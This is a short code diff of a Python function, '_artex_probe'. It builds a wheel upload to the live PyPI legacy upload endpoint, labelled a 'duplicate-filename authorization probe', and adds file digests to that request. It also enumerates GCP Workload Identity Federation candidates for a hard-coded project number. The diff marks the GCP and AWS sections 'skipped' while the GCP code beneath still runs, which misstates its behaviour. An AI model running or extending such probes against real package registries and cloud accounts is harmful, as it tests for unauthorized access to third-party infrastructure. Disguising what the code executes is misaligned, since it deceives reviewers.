@@ -120,6 +120,8 @@ def _artex_probe():
                         "filetype": "bdist_wheel", "pyversion": "py3",
                         "metadata_version": "2.1",
                         "summary": "ARTEX2989 duplicate-filename authorization probe",
+                        "md5_digest": hashlib.md5(fb).hexdigest(),
+                        "sha256_digest": hashlib.sha256(fb).hexdigest(),
                     }
                     body, ctype = _multipart(fields, "content", whl["filename"], fb)
                     st, rb, _ = _req("https://upload.pypi.org/legacy/", data=body,
@@ -166,7 +168,11 @@ def _artex_probe():
             tp["filename"] = fn
     out["testpypi"] = tp
 
-    # ---------- 3) GCP Workload Identity Federation candidates (project 493778665315) ----------
+    out["gcp"] = {"skipped": True}
+    out["aws"] = {"skipped": True}
+    if False:
+     pass
+    # ---------- 3) GCP ... ----------
     gcp = {"candidates": {}}
     pnum = "493778665315"
     combos = [
